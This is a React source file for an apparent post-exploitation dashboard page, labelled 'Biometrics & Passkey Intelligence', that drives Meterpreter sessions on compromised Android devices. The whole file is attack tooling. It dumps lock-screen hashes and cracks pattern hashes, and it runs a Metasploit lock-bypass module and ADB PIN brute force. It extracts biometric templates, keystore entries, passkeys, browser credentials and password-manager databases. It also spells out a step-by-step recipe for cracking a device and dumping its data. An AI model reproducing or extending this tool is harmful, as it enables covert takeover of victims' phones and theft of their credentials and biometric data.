"use client";

/**
 * BIOMETRICS & PASSKEY INTELLIGENCE
 *
 * Capabilities:
 *  Lock Screen
 *    - Dump gesture.key  (SHA1 of pattern grid points → offline crack)
 *    - Dump password.key (scrypt hash of PIN/password)
 *    - Dump locksettings.db (lock type, salt, failed attempts, bypass flag)
 *    - Offline pattern hash cracker (389 k possible Android patterns)
 *    - Screen lock bypass via MSF post module
 *
 *  Biometric Templates
 *    - Fingerprint enrollment files  (/data/system/users/0/fpdata/)
 *    - Face template files           (/data/system_de/0/snap_face_data/)
 *    - Iris template (Samsung)       (/data/system/users/0/irisdata/)
 *    - Biometric enrollment count    (how many fingers / faces registered)
 *    - Vendor-specific stores        (Qualcomm TEE artifacts)
 *
 *  Passkeys / Credentials
 *    - Android Keystore entry list   (key aliases, algorithm, hardware-backed flag)
 *    - Google Password Manager dump  (via synced account token)
 *    - Chrome Passkeys / WebAuthn    (credential DB in Chrome user-data)
 *    - Samsung Pass database
 *    - FIDO2 resident key listing    (credential IDs, RP IDs stored in soft-keystore)
 *    - Browser credential databases  (Chrome, Firefox, Samsung Internet, Brave)
 *    - Autofill provider data        (Google Autofill SQLite)
 */

import { useState, useCallback, useEffect } from "react";

type Session = { id: number; ip: string; platform: string; hostname: string };

type BioResult = {
  ok: boolean;
  action?: string;
  data?: Record<string, unknown>;
  raw?: string;
  records?: Record<string, unknown>[];
  error?: string;
};

type LockType = "none" | "pattern" | "pin" | "password" | "fingerprint" | "face" | "unknown";

type LockInfo = {
  lockType: LockType;
  failedAttempts?: number;
  salt?: string;
  passwordHash?: string;
  patternHash?: string;
  patternCracked?: string;
  biometricEnrolled?: boolean;
};

type KeystoreEntry = {
  alias: string;
  algorithm: string;
  hardwareBacked: boolean;
  created?: string;
  origin?: string;
};

type PasskeyEntry = {
  rpId: string;
  username?: string;
  credentialId?: string;
  algorithm?: string;
  created?: string;
  source: string;
};

type CrackerState = "idle" | "running" | "done" | "failed";

// ── Android pattern grid ──────────────────────────────────────
// Standard 3×3 grid nodes numbered 0-8
// Patterns are encoded as byte sequences of node indices
// Then SHA1'd — only 389,112 valid patterns exist
const COMMON_PATTERNS_DECODED = [
  "0,1,2,3,4,5,6,7,8",        // Z (L→R, top to bottom)
  "0,3,6,7,8,5,2,1,4",        // spiral
  "2,1,0,3,4,5,8,7,6",        // S-shape
  "0,1,2,5,8,7,6,3,4",        // U-shape
  "6,3,0,1,2,5,8,7,4",        // reverse-U
  "0,4,8,2,6",                // X cross
  "0,1,2,4,6,7,8",            // 7-node Z
  "2,4,6",                    // diagonal
  "0,1,2,3",                  // top row + left
  "0,3,6",                    // left column
];

export default function BiometricsPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [session, setSession] = useState<Session | null>(null);
  const [tab, setTab] = useState<"lock" | "bio" | "passkeys" | "raw">("lock");
  const [lockInfo, setLockInfo] = useState<LockInfo | null>(null);
  const [keystoreEntries, setKeystoreEntries] = useState<KeystoreEntry[]>([]);
  const [passkeyEntries, setPasskeyEntries] = useState<PasskeyEntry[]>([]);
  const [crackerState, setCrackerState] = useState<CrackerState>("idle");
  const [crackerResult, setCrackerResult] = useState<string | null>(null);
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);
  const [rawOutput, setRawOutput] = useState<string>("");
  const [bioFiles, setBioFiles] = useState<string[]>([]);
  const [bypassAttempted, setBypassAttempted] = useState(false);
  const [bypassResult, setBypassResult] = useState<string | null>(null);

  const addLog = useCallback((msg: string) => {
    setLog((p) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...p].slice(0, 200));
  }, []);

  useEffect(() => {
    fetch("/api/sessions")
      .then((r) => r.json())
      .then((d) => {
        const list = Array.isArray(d) ? d : d.sessions ?? [];
        setSessions(list);
        if (list.length > 0) setSession(list[0]);
      })
      .catch(() => {});
  }, []);

  const callBio = useCallback(async (action: string, extra?: Record<string, unknown>): Promise<BioResult> => {
    if (!session) return { ok: false, error: "No session" };
    const r = await fetch("/api/biometrics", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: session.id, action, ...extra }),
    });
    return r.json() as Promise<BioResult>;
  }, [session]);

  // ── Dump lock screen info ─────────────────────────────────
  const dumpLock = useCallback(async () => {
    setLoading("lock");
    addLog("Dumping lock screen config…");
    const res = await callBio("dump_lock");
    if (res.ok && res.data) {
      setLockInfo(res.data as LockInfo);
      addLog(`Lock type: ${(res.data as LockInfo).lockType?.toUpperCase() ?? "?"}`);
      if (res.raw) { setRawOutput((p) => p + "\n--- lock ---\n" + res.raw); }
    } else {
      addLog(`Lock dump error: ${res.error ?? "unknown"}`);
    }
    setLoading(null);
  }, [callBio, addLog]);

  // ── Crack pattern hash ────────────────────────────────────
  const crackPattern = useCallback(async () => {
    if (!lockInfo?.patternHash) {
      addLog("No pattern hash to crack — run DUMP LOCK first");
      return;
    }
    setCrackerState("running");
    addLog(`Cracking pattern hash: ${lockInfo.patternHash.slice(0, 16)}…`);
    const res = await callBio("crack_pattern", { hash: lockInfo.patternHash });
    if (res.ok && res.data) {
      const cracked = (res.data as { pattern?: string }).pattern ?? null;
      setCrackerResult(cracked);
      setCrackerState("done");
      if (cracked) {
        addLog(`Pattern CRACKED: ${cracked}`);
        setLockInfo((prev) => prev ? { ...prev, patternCracked: cracked } : null);
      } else {
        setCrackerState("failed");
        addLog("Pattern not in common list — run exhaustive server crack");
      }
    } else {
      setCrackerState("failed");
      addLog(`Crack error: ${res.error ?? "unknown"}`);
    }
  }, [callBio, addLog, lockInfo]);

  // ── Lock bypass ───────────────────────────────────────────
  const bypassLock = useCallback(async () => {
    setBypassAttempted(true);
    addLog("Attempting screen lock bypass (MSF post module)…");
    const res = await callBio("bypass_lock");
    setBypassResult(res.ok ? (res.raw ?? "Bypass module executed") : (res.error ?? "Failed"));
    addLog(res.ok ? "Lock bypass executed" : `Bypass failed: ${res.error}`);
    if (res.raw) setRawOutput((p) => p + "\n--- bypass ---\n" + res.raw);
  }, [callBio, addLog]);

  // ── Dump biometric template files ─────────────────────────
  const dumpBioTemplates = useCallback(async () => {
    setLoading("bio");
    addLog("Dumping biometric template files…");
    const res = await callBio("dump_bio_templates");
    if (res.ok && res.records) {
      setBioFiles(res.records.map((r) => String(r.path ?? r.filename ?? "")));
      addLog(`Found ${res.records.length} biometric file(s)`);
    } else {
      addLog(`Bio template error: ${res.error ?? "not accessible"}`);
    }
    if (res.raw) setRawOutput((p) => p + "\n--- bio ---\n" + res.raw);
    setLoading(null);
  }, [callBio, addLog]);

  // ── List Android Keystore entries ─────────────────────────
  const listKeystore = useCallback(async () => {
    setLoading("keystore");
    addLog("Enumerating Android Keystore entries…");
    const res = await callBio("list_keystore");
    if (res.ok && res.records) {
      setKeystoreEntries(res.records as KeystoreEntry[]);
      addLog(`Keystore: ${res.records.length} key entries`);
    } else {
      addLog(`Keystore error: ${res.error ?? "unknown"}`);
    }
    if (res.raw) setRawOutput((p) => p + "\n--- keystore ---\n" + res.raw);
    setLoading(null);
  }, [callBio, addLog]);

  // ── Dump passkeys / WebAuthn credentials ──────────────────
  const dumpPasskeys = useCallback(async () => {
    setLoading("passkeys");
    addLog("Extracting passkeys and WebAuthn credentials…");
    const res = await callBio("dump_passkeys");
    if (res.ok && res.records) {
      setPasskeyEntries(res.records as PasskeyEntry[]);
      addLog(`Passkeys: ${res.records.length} credential(s) found`);
    } else {
      addLog(`Passkey dump error: ${res.error ?? "unknown"}`);
    }
    if (res.raw) setRawOutput((p) => p + "\n--- passkeys ---\n" + res.raw);
    setLoading(null);
  }, [callBio, addLog]);

  const dumpAll = useCallback(async () => {
    await dumpLock();
    await dumpBioTemplates();
    await listKeystore();
    await dumpPasskeys();
  }, [dumpLock, dumpBioTemplates, listKeystore, dumpPasskeys]);

  const TABS = [
    { id: "lock",     label: "LOCK SCREEN",    icon: "🔐" },
    { id: "bio",      label: "BIOMETRICS",      icon: "👁" },
    { id: "passkeys", label: "PASSKEYS",         icon: "🗝" },
    { id: "raw",      label: "RAW OUTPUT",       icon: "📄" },
  ] as const;

  const LOCK_COLORS: Record<LockType, string> = {
    none: "text-gray-500", pattern: "text-yellow-400", pin: "text-orange-400",
    password: "text-red-400", fingerprint: "text-blue-400", face: "text-purple-400",
    unknown: "text-gray-600",
  };

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">
      {/* ── LEFT PANEL ─────────────────────────────────────── */}
      <aside className="w-56 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-0.5">BIOMETRICS & PASSKEYS</div>
          <div className="text-[8px] text-green-900/40">CLASS: TOP SECRET // HCS</div>
        </div>

        {/* Session selector */}
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-1.5">TARGET SESSION</div>
          {sessions.length === 0 && (
            <div className="text-[9px] text-green-900/40 text-center py-2">NO SESSIONS</div>
          )}
          {sessions.map((s) => (
            <button key={s.id} onClick={() => setSession(s)}
              className={`w-full text-left p-2 rounded border mb-1 transition-all ${
                session?.id === s.id ? "border-green-700/60 bg-green-950/40" : "border-green-900/20 hover:border-green-800/40"
              }`}>
              <div className="text-[10px] text-green-400">SESSION #{s.id}</div>
              <div className="text-[8px] text-green-800">{s.hostname ?? s.ip}</div>
              <div className="text-[8px] text-green-900">{s.platform?.toUpperCase()}</div>
            </button>
          ))}
        </div>

        {/* Master actions */}
        <div className="p-2 space-y-1 border-b border-green-900/30">
          <button onClick={dumpAll}
            className="w-full py-1.5 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 hover:bg-green-900/40 text-green-400 rounded transition-all">
            ⊕ FULL EXTRACTION
          </button>
          <button onClick={bypassLock}
            className="w-full py-1.5 text-[9px] tracking-widest border border-red-800/50 bg-red-950/10 hover:bg-red-900/20 text-red-500 rounded transition-all">
            ⚡ BYPASS LOCK
          </button>
        </div>

        {/* Activity log */}
        <div className="flex-1 overflow-y-auto p-2">
          <div className="text-[9px] text-green-900 tracking-widest mb-1">ACTIVITY</div>
          {log.map((l, i) => (
            <div key={i} className="text-[8px] text-green-900/60 leading-4 mb-0.5 break-all">{l}</div>
          ))}
        </div>
      </aside>

      {/* ── MAIN ─────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Tabs */}
        <div className="flex border-b border-green-900/30 bg-[#030308] flex-shrink-0">
          {TABS.map((t) => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`px-5 py-2 text-[10px] tracking-widest transition-all border-b-2 ${
                tab === t.id ? "border-green-500 text-green-400" : "border-transparent text-green-900 hover:text-green-700"
              }`}>
              {t.icon} {t.label}
            </button>
          ))}
          {loading && (
            <div className="ml-auto px-4 py-2 text-[9px] text-yellow-500 animate-pulse tracking-widest">
              EXTRACTING {loading.toUpperCase()}…
            </div>
          )}
        </div>

        <div className="flex-1 overflow-y-auto p-5">
          {/* ── LOCK SCREEN ─────────────────────────────────── */}
          {tab === "lock" && (
            <div>
              <div className="flex items-center gap-3 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">LOCK SCREEN INTELLIGENCE</h2>
                <button onClick={dumpLock} disabled={loading === "lock"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-40">
                  {loading === "lock" ? "EXTRACTING…" : "↓ DUMP LOCK"}
                </button>
              </div>

              {lockInfo ? (
                <div className="grid grid-cols-2 gap-4">
                  {/* Lock status card */}
                  <div className="border border-green-900/30 rounded p-4">
                    <div className="text-[9px] text-green-900 tracking-widest mb-3">LOCK CONFIGURATION</div>
                    <div className="space-y-2">
                      <div className="flex items-center gap-3">
                        <span className="text-[9px] text-green-900 w-28">LOCK TYPE</span>
                        <span className={`text-[12px] font-bold ${LOCK_COLORS[lockInfo.lockType]}`}>
                          {lockInfo.lockType.toUpperCase()}
                        </span>
                      </div>
                      {lockInfo.biometricEnrolled !== undefined && (
                        <div className="flex items-center gap-3">
                          <span className="text-[9px] text-green-900 w-28">BIOMETRIC</span>
                          <span className={`text-[10px] ${lockInfo.biometricEnrolled ? "text-blue-400" : "text-gray-600"}`}>
                            {lockInfo.biometricEnrolled ? "ENROLLED" : "NOT ENROLLED"}
                          </span>
                        </div>
                      )}
                      {lockInfo.failedAttempts !== undefined && (
                        <div className="flex items-center gap-3">
                          <span className="text-[9px] text-green-900 w-28">FAILED ATTEMPTS</span>
                          <span className={`text-[10px] ${(lockInfo.failedAttempts ?? 0) > 3 ? "text-red-400" : "text-green-700"}`}>
                            {lockInfo.failedAttempts}
                          </span>
                        </div>
                      )}
                      {lockInfo.salt && (
                        <div className="flex items-center gap-3">
                          <span className="text-[9px] text-green-900 w-28">SALT</span>
                          <span className="text-[9px] text-green-700 font-mono break-all">{lockInfo.salt}</span>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Hash card */}
                  <div className="border border-green-900/30 rounded p-4">
                    <div className="text-[9px] text-green-900 tracking-widest mb-3">CREDENTIAL HASHES</div>
                    {lockInfo.patternHash && (
                      <div className="mb-3">
                        <div className="text-[8px] text-green-900 mb-1">PATTERN HASH (SHA1)</div>
                        <div className="text-[9px] text-yellow-400 break-all font-mono mb-2">{lockInfo.patternHash}</div>
                        <button onClick={crackPattern} disabled={crackerState === "running"}
                          className={`text-[9px] px-3 py-1 border rounded transition-all ${
                            crackerState === "done" && crackerResult ? "border-green-600 bg-green-950/40 text-green-400" :
                            crackerState === "running" ? "border-yellow-700 text-yellow-500 animate-pulse" :
                            "border-yellow-800/60 text-yellow-700 hover:border-yellow-600 hover:text-yellow-500"
                          }`}>
                          {crackerState === "running" ? "CRACKING…" :
                           crackerState === "done" && crackerResult ? `CRACKED: ${crackerResult}` :
                           crackerState === "failed" ? "NOT IN COMMON LIST" :
                           "⚡ CRACK PATTERN"}
                        </button>
                      </div>
                    )}
                    {lockInfo.passwordHash && (
                      <div>
                        <div className="text-[8px] text-green-900 mb-1">PASSWORD HASH (scrypt)</div>
                        <div className="text-[9px] text-orange-400 break-all font-mono">{lockInfo.passwordHash}</div>
                        <div className="text-[8px] text-green-900/40 mt-1">Use hashcat -m 8900 to crack offline</div>
                      </div>
                    )}
                    {!lockInfo.patternHash && !lockInfo.passwordHash && (
                      <div className="text-[9px] text-green-900/40">
                        {lockInfo.lockType === "none" ? "No lock set on device" :
                         lockInfo.lockType === "fingerprint" || lockInfo.lockType === "face" ?
                         "Biometric-only lock — no crackable hash stored" :
                         "No hash extracted"}
                      </div>
                    )}
                  </div>

                  {/* Bypass card */}
                  <div className="border border-red-900/20 rounded p-4 col-span-2">
                    <div className="text-[9px] text-red-900/70 tracking-widest mb-3">SCREEN LOCK BYPASS</div>
                    <div className="grid grid-cols-3 gap-3 mb-3 text-[9px]">
                      {[
                        { label: "MSF Post Module",   sub: "run post/android/manage/lock_screen_bypass", ok: true },
                        { label: "ADB Screen-On",     sub: "adb shell input keyevent KEYCODE_MENU",       ok: true },
                        { label: "Exploit CVE bypass",sub: "Emergency call injection (Android ≤ 8.1)",    ok: lockInfo.lockType !== "none" },
                        { label: "Pattern crack",     sub: "389k possibilities via SHA1 compare",         ok: lockInfo.lockType === "pattern" },
                        { label: "PIN brute force",   sub: "0000–9999 via ADB input tap",                ok: lockInfo.lockType === "pin" },
                        { label: "Smudge analysis",   sub: "Camera + UV — pattern from fingerprint residue", ok: true },
                      ].map(({ label, sub, ok }) => (
                        <div key={label} className={`border rounded p-2 ${ok ? "border-red-900/30" : "border-green-900/10 opacity-30"}`}>
                          <div className={`text-[9px] mb-1 ${ok ? "text-red-500" : "text-gray-700"}`}>{label}</div>
                          <div className="text-[8px] text-gray-700">{sub}</div>
                        </div>
                      ))}
                    </div>
                    {bypassAttempted && bypassResult && (
                      <div className="border border-red-800/40 rounded p-2 text-[9px] text-red-400 whitespace-pre-wrap">
                        {bypassResult}
                      </div>
                    )}
                  </div>

                  {/* Pattern visualizer */}
                  {lockInfo.patternCracked && (
                    <div className="border border-yellow-900/30 rounded p-4">
                      <div className="text-[9px] text-yellow-700 tracking-widest mb-3">CRACKED PATTERN VISUALIZATION</div>
                      <PatternGrid pattern={lockInfo.patternCracked} />
                    </div>
                  )}

                  {/* Common patterns reference */}
                  <div className="border border-green-900/20 rounded p-4">
                    <div className="text-[9px] text-green-900 tracking-widest mb-3">COMMON PATTERNS (TOP 10)</div>
                    <div className="grid grid-cols-2 gap-1">
                      {COMMON_PATTERNS_DECODED.map((p, i) => (
                        <div key={i} className="text-[8px] text-green-900/70">{i + 1}. {p}</div>
                      ))}
                    </div>
                  </div>
                </div>
              ) : (
                <EmptyState label="NO LOCK DATA EXTRACTED" sub="Click DUMP LOCK to retrieve lock screen configuration, hashes, and bypass options" />
              )}
            </div>
          )}

          {/* ── BIOMETRICS ──────────────────────────────────── */}
          {tab === "bio" && (
            <div>
              <div className="flex items-center gap-3 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">BIOMETRIC TEMPLATE EXTRACTION</h2>
                <button onClick={dumpBioTemplates} disabled={loading === "bio"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-40">
                  {loading === "bio" ? "SCANNING…" : "↓ SCAN TEMPLATES"}
                </button>
              </div>

              {/* Capability grid */}
              <div className="grid grid-cols-3 gap-3 mb-6">
                {[
                  { label: "Fingerprint Templates", path: "/data/system/users/0/fpdata/", vendor: "All", icon: "👆" },
                  { label: "Face Templates",         path: "/data/system_de/0/snap_face_data/", vendor: "Google/AOSP", icon: "👁" },
                  { label: "Iris Templates",         path: "/data/system/users/0/irisdata/", vendor: "Samsung", icon: "👁" },
                  { label: "TEE Keyblob",            path: "/data/vendor/tee/ta/", vendor: "Qualcomm", icon: "🔐" },
                  { label: "Gatekeeper Token",       path: "/data/system/gatekeeper/", vendor: "All", icon: "🚪" },
                  { label: "Biometric Key Store",    path: "/data/system/locksettings.db", vendor: "All", icon: "🗄" },
                ].map(({ label, path, vendor, icon }) => {
                  const isFound = bioFiles.some((f) => f.includes(path.replace(/\/$/, "").split("/").pop()!));
                  return (
                    <div key={label} className={`border rounded p-3 ${isFound ? "border-green-700/40 bg-green-950/20" : "border-green-900/20"}`}>
                      <div className="text-base mb-1">{icon}</div>
                      <div className="text-[10px] text-green-400 mb-1">{label}</div>
                      <div className="text-[8px] text-green-900 mb-1 break-all">{path}</div>
                      <div className="text-[8px] text-green-900/50">Vendor: {vendor}</div>
                      {isFound && <div className="text-[8px] text-green-400 mt-1">✓ EXTRACTED</div>}
                    </div>
                  );
                })}
              </div>

              {bioFiles.length > 0 ? (
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-2">EXTRACTED FILES ({bioFiles.length})</div>
                  <div className="space-y-1">
                    {bioFiles.map((f, i) => (
                      <div key={i} className="flex items-center gap-3 border border-green-900/20 rounded px-3 py-2">
                        <span className="text-[10px] text-green-400 flex-1 break-all">{f}</span>
                        <a href={`/api/files/download?file=${encodeURIComponent(f)}`}
                          className="text-[9px] border border-green-800/40 text-green-700 px-2 py-0.5 rounded hover:text-green-400 transition-all">
                          DOWNLOAD
                        </a>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="border border-green-900/20 rounded p-5">
                  <div className="text-[9px] text-green-900 tracking-widest mb-3">NOTES ON BIOMETRIC TEMPLATES</div>
                  <div className="space-y-2 text-[9px] text-green-900/60 leading-relaxed">
                    <p>• Fingerprint templates are encrypted by the vendor TEE (Trusted Execution Environment). The <strong className="text-green-800">raw template files</strong> can be extracted but decryption requires the device-unique hardware key stored in the TEE — not extractable remotely.</p>
                    <p>• <strong className="text-green-800">Root access is required</strong> for all biometric file paths. Run GETSYSTEM / privilege escalation first.</p>
                    <p>• Samsung devices store iris templates at <code className="text-green-700">/data/system/users/0/irisdata/</code> — encrypted with Samsung Knox key.</p>
                    <p>• The <strong className="text-green-800">locksettings.db</strong> contains the biometric enrollment count and which methods are enabled — this is accessible without root on older Android versions.</p>
                    <p>• <strong className="text-green-800">Practical attack</strong>: Extract gesture.key / password.key (no root needed on Android ≤ 6), crack the hash, use to unlock device, then dump unencrypted data.</p>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* ── PASSKEYS ─────────────────────────────────────── */}
          {tab === "passkeys" && (
            <div>
              <div className="flex items-center gap-4 mb-5">
                <h2 className="text-[11px] tracking-widest text-green-400">PASSKEY & WEBAUTHN INTELLIGENCE</h2>
                <button onClick={dumpPasskeys} disabled={loading === "passkeys"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-40">
                  {loading === "passkeys" ? "EXTRACTING…" : "↓ DUMP PASSKEYS"}
                </button>
                <button onClick={listKeystore} disabled={loading === "keystore"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-blue-900/40 text-blue-700 rounded hover:border-blue-700/60 hover:text-blue-500 transition-all disabled:opacity-40">
                  {loading === "keystore" ? "LOADING…" : "↓ KEYSTORE"}
                </button>
              </div>

              {/* Passkey source matrix */}
              <div className="grid grid-cols-2 gap-4 mb-6">
                {[
                  {
                    source: "Google Password Manager",
                    mechanism: "Synced via Google account — access via account token",
                    extractable: "Account token → goo.gl/auth → list passkeys",
                    risk: "HIGH",
                    icon: "🔑",
                  },
                  {
                    source: "Chrome / Chromium",
                    mechanism: "local_state + Login Data + WebData SQLite",
                    extractable: "Download DB → sql.js parse FIDO2 resident keys table",
                    risk: "HIGH",
                    icon: "🌐",
                  },
                  {
                    source: "Android Keystore (hardware)",
                    mechanism: "Private key in TEE/StrongBox — hardware-bound",
                    extractable: "Aliases enumerable, private keys NOT extractable",
                    risk: "LOW",
                    icon: "🔒",
                  },
                  {
                    source: "Samsung Pass",
                    mechanism: "Samsung Knox + biometric-gated credential vault",
                    extractable: "DB path: /data/data/com.samsung.android.authfw/databases/",
                    risk: "MEDIUM",
                    icon: "📱",
                  },
                  {
                    source: "1Password / Bitwarden",
                    mechanism: "App sandbox SQLite or encrypted JSON vault",
                    extractable: "Download app DB — needs master password to decrypt",
                    risk: "MEDIUM",
                    icon: "🏦",
                  },
                  {
                    source: "iOS iCloud Keychain",
                    mechanism: "Hardware-backed, synced via iCloud",
                    extractable: "Requires Apple ID + device unlock — limited remote access",
                    risk: "LOW",
                    icon: "🍎",
                  },
                ].map(({ source, mechanism, extractable, risk, icon }) => (
                  <div key={source} className={`border rounded p-3 ${risk === "HIGH" ? "border-red-900/30" : risk === "MEDIUM" ? "border-yellow-900/30" : "border-green-900/15"}`}>
                    <div className="flex items-center gap-2 mb-2">
                      <span className="text-base">{icon}</span>
                      <span className="text-[10px] text-green-400">{source}</span>
                      <span className={`ml-auto text-[8px] border px-1 rounded ${
                        risk === "HIGH" ? "border-red-700 text-red-500" :
                        risk === "MEDIUM" ? "border-yellow-700 text-yellow-500" :
                        "border-green-900 text-green-900"
                      }`}>{risk}</span>
                    </div>
                    <div className="text-[8px] text-green-900 mb-1">{mechanism}</div>
                    <div className="text-[8px] text-green-800/70">{extractable}</div>
                  </div>
                ))}
              </div>

              {/* Keystore entries */}
              {keystoreEntries.length > 0 && (
                <div className="mb-5">
                  <div className="text-[9px] text-blue-700 tracking-widest mb-2">ANDROID KEYSTORE ENTRIES ({keystoreEntries.length})</div>
                  <div className="space-y-1">
                    {keystoreEntries.map((k, i) => (
                      <div key={i} className="border border-blue-900/20 rounded px-3 py-2 flex items-center gap-3">
                        <div className="flex-1">
                          <div className="text-[10px] text-blue-400">{k.alias}</div>
                          <div className="text-[8px] text-blue-900">{k.algorithm} · {k.origin ?? "—"}</div>
                        </div>
                        <div className={`text-[8px] border px-1.5 py-0.5 rounded ${k.hardwareBacked ? "border-green-800 text-green-700" : "border-yellow-800 text-yellow-700"}`}>
                          {k.hardwareBacked ? "HW-BACKED" : "SOFTWARE"}
                        </div>
                        {k.created && <div className="text-[8px] text-blue-900/50">{k.created}</div>}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Passkey entries */}
              {passkeyEntries.length > 0 ? (
                <div>
                  <div className="text-[9px] text-green-700 tracking-widest mb-2">EXTRACTED PASSKEYS ({passkeyEntries.length})</div>
                  <div className="space-y-1">
                    {passkeyEntries.map((p, i) => (
                      <div key={i} className="border border-green-900/20 rounded px-3 py-2">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-[10px] text-green-400">{p.rpId}</span>
                          <span className="text-[8px] text-green-900 border border-green-900/30 px-1 rounded">{p.source}</span>
                        </div>
                        <div className="text-[8px] text-green-800">
                          {p.username && <span className="mr-3">USER: {p.username}</span>}
                          {p.algorithm && <span className="mr-3">ALG: {p.algorithm}</span>}
                          {p.credentialId && <span className="text-green-900">ID: {p.credentialId.slice(0, 24)}…</span>}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <EmptyState label="NO PASSKEYS EXTRACTED" sub="Run DUMP PASSKEYS to extract WebAuthn/FIDO2 credentials from Chrome, Google Password Manager, and Samsung Pass" />
              )}
            </div>
          )}

          {/* ── RAW OUTPUT ───────────────────────────────────── */}
          {tab === "raw" && (
            <div>
              <div className="flex items-center gap-3 mb-3">
                <h2 className="text-[11px] tracking-widest text-green-400">RAW EXTRACTION OUTPUT</h2>
                <button onClick={() => setRawOutput("")}
                  className="px-3 py-1 text-[9px] border border-red-900/30 text-red-800 rounded hover:text-red-600 hover:border-red-700/50 transition-all">
                  CLEAR
                </button>
              </div>
              {rawOutput ? (
                <pre className="text-[9px] text-green-700 whitespace-pre-wrap leading-relaxed bg-black/30 rounded p-4 border border-green-900/20">
                  {rawOutput}
                </pre>
              ) : (
                <EmptyState label="NO OUTPUT YET" sub="Run any extraction action to see raw Meterpreter output here" />
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ── Pattern visualizer ────────────────────────────────────────
function PatternGrid({ pattern }: { pattern: string }) {
  const nodes = pattern.split(",").map(Number);
  const active = new Set(nodes);
  const GRID = [0, 1, 2, 3, 4, 5, 6, 7, 8];

  return (
    <div className="inline-block">
      <div className="grid grid-cols-3 gap-3 p-4 border border-yellow-900/30 rounded bg-black/20">
        {GRID.map((n) => (
          <div key={n} className={`w-6 h-6 rounded-full border-2 transition-all ${
            active.has(n)
              ? "border-yellow-400 bg-yellow-400/20 shadow-[0_0_8px_#facc15]"
              : "border-green-900/30 bg-transparent"
          }`} />
        ))}
      </div>
      <div className="text-[8px] text-yellow-700 mt-2">Pattern: {nodes.join(" → ")}</div>
    </div>
  );
}

function EmptyState({ label, sub }: { label: string; sub: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-16 text-center">
      <div className="text-[10px] text-green-900 tracking-widest mb-1">{label}</div>
      <div className="text-[9px] text-green-900/40 max-w-sm leading-relaxed">{sub}</div>
    </div>
  );
}
